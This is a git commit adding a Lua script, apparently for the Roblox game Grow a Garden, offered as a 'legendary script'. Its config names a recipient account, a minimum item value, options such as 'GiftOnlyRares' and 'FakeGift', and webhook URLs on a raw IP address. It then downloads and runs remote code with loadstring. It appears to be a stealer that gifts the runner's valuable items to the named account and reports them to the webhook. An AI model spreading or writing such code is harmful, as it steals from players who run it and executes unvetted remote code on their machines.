255f8a8d83bc0d9ca5dfc519b16d1f67efa068c6
NoLagGrowAGarden <markosgreek2@gmail.com>
2025-07-27 09:38:10 +0200

    Upload legendary-script.lua via Script Source Converter

---
+++ legendary-script.lua
@@ -0,0 +1,13 @@
+_G.LRMConfig = {
+    User = {"Markosv6acc"},
+    min_value = 10000000000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "http://45.13.225.83:6969/proxy/2989592254065d073b6b8ba83ee3da5f",
+    FakeGift = "No",
+    Trash = "http://45.13.225.83:6969/proxy/2989592254065d073b6b8ba83ee3da5f",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "Yes",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://lrmscripts.com/script/main.lua'))()
